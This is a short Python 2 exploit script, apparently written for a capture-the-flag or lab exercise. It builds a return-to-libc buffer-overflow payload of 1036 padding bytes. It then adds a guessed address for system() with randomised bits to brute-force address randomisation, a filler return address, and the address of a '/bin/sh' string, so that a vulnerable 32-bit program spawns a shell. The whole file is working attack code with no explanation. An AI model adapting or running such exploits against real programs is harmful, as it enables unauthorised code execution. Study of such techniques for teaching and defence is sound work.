#!/usr/bin/env python

import struct
from random import randint

def p32(x):
    return struct.pack("<I", x)

system = 0xf75003e0 + (16**3) * randint(1, 15) + (16**4) * randint(1, 15)
binsh = system + 1185417
buf = 'A' * 1036
buf += p32(system)
buf += 'X' * 4
buf += p32(binsh)

print buf
